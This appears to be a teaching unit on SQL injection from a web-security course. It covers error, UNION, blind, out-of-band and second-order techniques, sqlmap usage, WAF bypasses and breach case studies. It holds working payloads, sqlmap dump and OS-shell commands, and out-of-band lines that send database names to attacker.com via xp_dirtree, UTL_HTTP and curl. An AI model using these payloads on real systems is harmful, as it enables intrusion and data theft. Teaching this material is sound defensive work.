# Unit 3: A03 - Injection — Topic 2: SQL Injection Deep Dive

## Overview

SQL Injection (SQLi) is the most well-known and destructive injection attack, allowing attackers to **read, modify, or delete database contents, bypass authentication, and in some cases achieve remote code execution**. Despite being understood for over 25 years, SQLi remains prevalent — responsible for breaches at Sony, TalkTalk, Heartland Payment Systems, and countless others. This deep dive covers every SQLi variant, database-specific techniques, tool usage, WAF bypass, and real-world case studies.

---

## 1. SQLi Classification

```
┌─────────────────────────────────────────────────────────────────┐
│                  SQL INJECTION TAXONOMY                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  IN-BAND (Classic)                                             │
│  ├── Error-Based: Extract data via error messages              │
│  └── UNION-Based: Combine results with UNION SELECT            │
│                                                                 │
│  BLIND                                                          │
│  ├── Boolean-Based: True/false responses differ                │
│  └── Time-Based: Response delay indicates true/false           │
│                                                                 │
│  OUT-OF-BAND                                                   │
│  └── DNS/HTTP exfiltration when no direct output               │
│                                                                 │
│  SECOND-ORDER                                                  │
│  └── Payload stored, executed in different context later       │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. In-Band SQLi

### Error-Based

```sql
-- Extract database version through error
' AND 1=CONVERT(int, @@version)--       -- MSSQL
' AND 1=1/(SELECT 0 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -- MySQL
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--  -- MySQL

-- Example error output:
-- Conversion failed when converting the nvarchar value 
-- 'Microsoft SQL Server 2019 (RTM) - 15.0.2000.5' to data type int
```

### UNION-Based

```sql
-- Step 1: Determine number of columns
' ORDER BY 1-- ✅ (works)
' ORDER BY 2-- ✅ (works)
' ORDER BY 3-- ✅ (works)
' ORDER BY 4-- ❌ (error = 3 columns)

-- Step 2: Find displayable columns
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--   -- Check which column displays
' UNION SELECT NULL,'a',NULL--

-- Step 3: Extract data
' UNION SELECT NULL,username,password FROM users--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Step 4: Extract specific data
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
```

### Database Enumeration Cheat Sheet

| Task | MySQL | PostgreSQL | MSSQL | Oracle |
|------|-------|------------|-------|--------|
| **Version** | `version()` | `version()` | `@@version` | `banner FROM v$version` |
| **Current DB** | `database()` | `current_database()` | `DB_NAME()` | `ora_database_name` |
| **Current User** | `user()` | `current_user` | `SYSTEM_USER` | `user` |
| **List DBs** | `schema_name FROM information_schema.schemata` | Same | `name FROM sys.databases` | `owner FROM all_tables` |
| **List Tables** | `table_name FROM information_schema.tables` | Same | Same | `table_name FROM all_tables` |
| **List Columns** | `column_name FROM information_schema.columns` | Same | Same | `column_name FROM all_tab_columns` |
| **String Concat** | `CONCAT(a,b)` or `a || b` | `a \|\| b` | `a + b` | `a \|\| b` |
| **Substring** | `SUBSTRING(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTR(s,1,1)` |
| **Comments** | `-- ` or `#` | `-- ` | `-- ` | `-- ` |

---

## 3. Blind SQLi

### Boolean-Based

```sql
-- Original: GET /item?id=1 → "Item: Widget" (200 OK)

-- Test TRUE condition
GET /item?id=1 AND 1=1    → "Item: Widget" (normal response)
-- Test FALSE condition
GET /item?id=1 AND 1=2    → "" (different/empty response)
-- If responses differ → Boolean blind SQLi confirmed!

-- Extract data character by character
-- Is first char of database name > 'm'?
1 AND SUBSTRING(database(),1,1) > 'm'    → True/False
-- Is it > 's'?
1 AND SUBSTRING(database(),1,1) > 's'    → True/False
-- Binary search narrows down each character

-- Extract admin password
1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1) = 'a'
1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1) = 'b'
-- Continue until character matches...
```

### Time-Based

```sql
-- When no visible difference in responses, use time delays

-- MySQL
1 AND IF(1=1, SLEEP(5), 0)--              → 5 second delay = TRUE
1 AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--

-- PostgreSQL
1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL
1; IF (1=1) WAITFOR DELAY '0:0:5'--
1; IF (SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:5'--

-- Oracle
1 AND 1=CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END
```

---

## 4. Out-of-Band and Second-Order SQLi

### Out-of-Band (OOB)

```sql
-- DNS exfiltration (when no in-band or blind response)

-- MSSQL
'; EXEC master..xp_dirtree '\\attacker.com\' + DB_NAME() + '.share'--
-- Generates DNS lookup: currentdb.attacker.com

-- MySQL (requires FILE privilege)
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));

-- Oracle
SELECT UTL_HTTP.REQUEST('http://attacker.com/' || (SELECT user FROM dual)) FROM dual;

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/?data=' || current_database();
```

### Second-Order SQLi

```
Step 1: Register with malicious username
  Username: admin'--
  Password: anything
  → Stored in database as: admin'--

Step 2: Later, application uses stored value in query
  Password change function:
  UPDATE users SET password='newpass' WHERE username='admin'--'
  → Actually executes: UPDATE users SET password='newpass' WHERE username='admin'
  → Changes admin's password!
```

---

## 5. sqlmap Usage

```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1" --batch

# POST request
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch

# With cookies/headers
sqlmap -u "http://target.com/api/item?id=1" \
    --cookie="session=abc123" \
    --headers="Authorization: Bearer token123"

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Dump table data
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# OS shell (if possible)
sqlmap -u "http://target.com/page?id=1" --os-shell

# Technique specification
sqlmap -u "http://target.com/page?id=1" --technique=BT  # Boolean + Time-based only

# Risk and level
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3  # Maximum testing

# WAF bypass
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between,randomcase

# Through proxy (Burp)
sqlmap -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080"
```

---

## 6. WAF Bypass Techniques

| Technique | Example | Purpose |
|-----------|---------|---------|
| **Case variation** | `SeLeCt`, `uNiOn` | Bypass case-sensitive filters |
| **Comment injection** | `UN/**/ION SEL/**/ECT` | Break up keywords |
| **URL encoding** | `%55NION %53ELECT` | Bypass string matching |
| **Double encoding** | `%2527` (decoded to `%27` then `'`) | Bypass single-decode filters |
| **Null bytes** | `%00' UNION SELECT` | Terminate string processing |
| **Alternative syntax** | `UNION ALL SELECT` vs `UNION SELECT` | Different keywords |
| **Whitespace alternatives** | `UNION%09SELECT`, `UNION%0ASELECT` | Tab/newline instead of space |
| **Scientific notation** | `0e1UNION SELECT` | Confuse parsers |
| **Buffer overflow** | Long padding before payload | Exceed WAF buffer |

```sql
-- Bypass examples
-- Space substitution
UNION%09SELECT%091,2,3
UNION/**/SELECT/**/1,2,3

-- Keyword splitting
UNI%4FN SE%4CECT 1,2,3

-- No-space techniques (MySQL)
'OR(1=1)#
'UNION(SELECT(1),(2),(3))#
```

---

## 7. Real-World SQLi Breaches

### Heartland Payment Systems (2008)

```
Impact: 130 million credit card numbers stolen
Method: SQL injection in web-facing payment application
Result: $140 million in costs, CEO convicted
Root cause: No parameterized queries, no WAF
```

### Sony Pictures (2011)

```
Impact: 77 million PlayStation Network accounts
Method: SQL injection in login functionality
Result: 23-day outage, $171 million loss
Root cause: Unsanitized input in authentication query
```

### TalkTalk (2015)

```
Impact: 157,000 customer records (4 million affected)
Method: SQL injection by a 15-year-old
Result: £400,000 fine, CEO resigned
Root cause: Legacy systems with known SQLi vulnerabilities
```

---

## Summary Table

| SQLi Type | Data Channel | Speed | Detection |
|-----------|-------------|-------|-----------|
| **Error-based** | Error messages | Fast | Easy |
| **UNION-based** | Query results | Fast | Easy |
| **Boolean-blind** | Response difference | Slow | Medium |
| **Time-blind** | Response delay | Very slow | Hard |
| **Out-of-band** | DNS/HTTP | Medium | Hard |
| **Second-order** | Stored + triggered | Variable | Very hard |

---

## Revision Questions

1. Explain the step-by-step process of UNION-based SQL injection from column count determination to data extraction.
2. How does time-based blind SQLi work? Write payloads for MySQL, MSSQL, and PostgreSQL.
3. What is second-order SQL injection? Why is it harder to detect than first-order?
4. Describe five WAF bypass techniques for SQL injection and provide example payloads.
5. How would you use sqlmap to enumerate databases, tables, and dump data from a vulnerable endpoint?
6. Compare the SQL injection cheat sheets for MySQL, PostgreSQL, MSSQL, and Oracle.

---

*Previous: [01-injection-types.md](01-injection-types.md) | Next: [03-nosql-injection.md](03-nosql-injection.md)*

---

*[Back to README](../README.md)*
